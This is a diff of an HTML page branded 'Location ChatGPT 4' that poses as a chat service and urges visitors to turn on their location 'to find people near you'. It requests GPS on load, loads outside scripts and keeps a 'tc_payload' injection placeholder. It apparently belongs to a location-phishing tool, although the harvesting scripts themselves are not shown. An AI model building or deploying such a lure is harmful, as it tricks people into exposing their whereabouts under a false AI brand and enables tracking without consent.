@@ -1,19 +1,21 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Find - people</title>
   <link rel="stylesheet" href="./style.css">
-
+  <link rel="manifest" href="./manifest.json">
+  <meta name="theme-color" content="#579ffb">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body onload="gpsLocation()">
 <section class="msger">
   <header class="msger-header">
     <div class="msger-header-title">
-      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
+      Location ChatGPT 4
     </div>
     <div class="msger-header-options">
-      <span><i class="fas fa-cog"></i></span>
+      <span>online</span>
     </div>
   </header>
 
@@ -31,7 +33,7 @@
         </div>
 
         <div class="msg-text">
-          Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
+          Hi! Turn on your location to find people near you.
         </div>
       </div>
     </div>
@@ -43,9 +45,9 @@
     <button type="submit" class="msger-send-btn">Send</button>
   </form>
 </section>
-<script  src="./script.js"></script>
-<p id="techchip"></p>
+<script src="./smart_client.js"></script>
 <!-- tc_payload -->
+<script src="./script.js"></script>
 
 </body>
 </html>
